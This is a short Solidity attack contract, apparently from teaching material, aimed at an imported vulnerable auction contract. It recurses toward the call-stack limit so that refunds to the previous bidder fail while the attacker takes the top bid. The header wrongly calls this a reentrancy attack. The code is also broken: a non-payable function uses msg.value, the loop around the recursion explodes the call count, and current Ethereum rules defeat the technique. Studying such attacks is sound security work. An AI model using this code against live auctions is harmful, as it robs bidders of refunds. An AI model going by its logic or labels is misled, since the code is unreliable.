pragma solidity ^0.4.25;

import './BadAuction.sol';

/**
@title Auction reentrancy attack
@author Ahmed Ali <ahmedaabdulwahed@gmail.com>
This contract meant to be a reentrancy attack for
the auction contract
**/

contract AttackBadAuction {

    BadAuction private auction;

    constructor(address _badAuctionAddress) {
        // create new instance of the contract
        require(_badAuctionAddress != address(0), 'invalid auction contract address');
        auction = BadAuction(_badAuctionAddress);
    }

    function attack() public {
        for (uint256 i=0; i <= 1023; i++){
            if(i==1023) {
                //max stack depth reach 1024 when send() method is called
                // which in turn will fail without reverting
                // an error. The previous bidder will not receive the refund,
                // but the new bidder will still be highest bidder
                auction.bid(msg.value);
            }else {
                // recursive call to reach the max stack depth
                attack();
            }
        }
    }
}